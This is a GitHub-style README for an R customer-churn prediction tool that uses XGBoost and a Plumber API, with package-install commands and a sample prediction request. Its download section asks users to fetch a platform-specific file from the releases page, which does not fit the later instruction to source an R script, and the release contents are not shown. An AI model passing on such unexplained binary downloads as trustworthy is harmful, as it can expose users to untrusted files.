# 🎉 Customer_Churn_Prediction - Predict Customer Churn Easily

## 🚀 Getting Started

Welcome to the Customer Churn Prediction project! This application helps businesses predict customer churn using machine learning. With our easy-to-use tool, you can make informed decisions to retain your customers.

## 📥 Download & Install

To get started, you need to download the latest version of the application. 

**[Download Here](https://github.com/esbastiango/Customer_Churn_Prediction/releases)**

1. Click the link above to visit our Releases page.
2. Look for the latest release version.
3. Download the appropriate file for your system (Windows, Mac, or Linux).

## 🛠️ System Requirements

Before installation, ensure your system meets the following requirements:

- **Operating System:** Windows 10 or later, macOS 10.15 or later, or any Linux distribution with recent libraries.
- **R Version:** R 4.0 or later.
- **R Packages:** You’ll need `xgboost`, `plumber`, and `tidymodels`. We will guide you on how to install these packages.

## 🔧 Installation Steps

1. **Install R:** If you haven't installed R, visit [CRAN](https://cran.r-project.org/) to download and install it.
2. **Open R or RStudio:** Start R or RStudio on your computer.
3. **Install Required Packages:**
   Open your R environment and run the following commands to install the necessary packages:
   ```R
   install.packages("xgboost")
   install.packages("plumber")
   install.packages("tidymodels")
   ```

## 📊 Using the Application

Once you have installed the necessary packages and downloaded the latest version of the application, you can run it. Follow these steps:

1. **Launch R:** Open R or RStudio.
2. **Load the Churn Prediction Script:**
   Use the following command to load the application:
   ```R
   source("path/to/your/downloaded/script.R")
   ```
   (Replace `path/to/your/downloaded/script.R` with the actual path where you saved the script file.)

3. **Start the API:**
   Run the function to start the REST API for live predictions. This command may look like:
   ```R
   run_api()
   ```
   This will set up a local server where you can send requests.

## 📡 Making Predictions

To make a prediction, you need to send a request to the API. Here’s how:

1. Using a tool like Postman or cURL, make a POST request to `http://localhost:8000/predict`.
2. Include the necessary data points about your customer in the body of the request as JSON format.

For example:
```json
{
  "customer_age": 35,
  "monthly_spend": 75,
  "years_with_company": 2
}
```

You will receive a prediction about the likelihood of this customer churning.

## 🔍 Features

- **Tuned XGBoost Model:** Our application uses a tuned XGBoost model for high accuracy in predicting customer churn.
- **User-Friendly API:** The Plumber package allows seamless integration for real-time predictions via API.
- **Documentation:** Clear instructions make it easier for any user to follow along.

## 📁 Exploring the Code

If you're interested in exploring the source code, you can find it in the `/src` directory of the repository. Here you will see how we built the model and set up the API.

## 🤝 Contribution

If you wish to contribute to this project, feel free to fork the repository and submit a pull request. We appreciate all contributions that enhance the functionality and usability of this tool.

## 🔗 Helpful Links

- [Download Here](https://github.com/esbastiango/Customer_Churn_Prediction/releases)
- [Documentation](https://github.com/esbastiango/Customer_Churn_Prediction/wiki)
- [Project Issues](https://github.com/esbastiango/Customer_Churn_Prediction/issues)

## 💬 Support

For questions or support, please open an issue in the repository. We’ll be happy to assist you.

Thank you for using Customer Churn Prediction! Enjoy predicting and retaining your customers successfully.